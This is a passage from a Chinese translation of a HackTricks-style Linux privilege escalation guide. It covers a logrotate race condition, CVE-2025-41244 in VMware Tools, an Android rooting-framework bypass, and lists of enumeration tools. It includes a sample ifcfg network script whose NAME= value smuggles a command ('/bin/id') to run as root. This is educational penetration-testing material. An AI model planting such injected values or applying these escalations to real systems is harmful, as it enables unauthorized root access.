关于该漏洞的更多详细信息见此页面： [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)。

你可以使用 [**logrotten**](https://github.com/whotwagner/logrotten) 利用该漏洞。

该漏洞与 [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** 非常相似，因此每当你发现可以更改日志时，检查是谁在管理这些日志，并检查是否可以通过将日志替换为符号链接来提权。

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

如果由于某种原因，用户能够向 _/etc/sysconfig/network-scripts_ 写入 `ifcf-<whatever>` 脚本 **或** 能够 **调整** 现有脚本，那么你的 **系统已被 pwned**。

网络脚本，例如 _ifcg-eth0_，用于网络连接。它们看起来完全像 .INI 文件。然而，它们在 Linux 上被 Network Manager (dispatcher.d) \~sourced\~。

在我的情况下，这些网络脚本中的 `NAME=` 属性没有被正确处理。如果名称中有 **空格/blank 空白，系统会尝试执行空格之后的部分**。这意味着 **第一个空格之后的所有内容都会以 root 身份执行**。

例如： _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_注意 'Network' 和 /bin/id 之间的空格_)

### **init, init.d, systemd, and rc.d**

目录 `/etc/init.d` 存放 System V init (SysVinit) 的 **脚本**，这是经典的 Linux 服务管理系统。它包含用于 `start`、`stop`、`restart`，有时还用于 `reload` 服务的脚本。这些脚本可以直接执行，也可以通过位于 `/etc/rc?.d/` 的符号链接来调用。在 Redhat 系统中，备用路径是 `/etc/rc.d/init.d`。

另一方面，`/etc/init` 与 **Upstart** 相关联，Upstart 是由 Ubuntu 引入的一种较新的 **service management**，使用配置文件来管理服务。尽管系统已向 Upstart 迁移，但由于 Upstart 中存在兼容层，SysVinit 脚本仍然与 Upstart 配置一起使用。

**systemd** 作为现代的初始化和服务管理器出现，提供了按需启动守护进程、automount 管理以及系统状态快照等高级特性。它将文件组织到 `/usr/lib/systemd/`（发行版包）和 `/etc/systemd/system/`（管理员修改）中，从而简化了系统管理流程。

## 其他技巧

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks 通常会 hook 一个 syscall，将特权内核功能暴露给 userspace manager。弱的 manager 认证（例如基于 FD-order 的签名校验或不安全的密码方案）可能允许本地 app 冒充 manager，并在已 root 的设备上提升为 root。更多信息和利用细节见：


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

VMware Tools/Aria Operations 中基于正则的 service discovery 可能从进程命令行中提取二进制路径并在提升权限的上下文中以 -v 执行它。过于宽松的模式（例如使用 \S）可能匹配攻击者放置在可写位置（如 /tmp/httpd）中的监听程序，从而导致以 root 身份执行（CWE-426 Untrusted Search Path）。

了解更多并查看适用于其他 discovery/monitoring 堆栈的通用模式，请参见：

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## 内核安全防护

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## 更多帮助

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## 参考资料

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
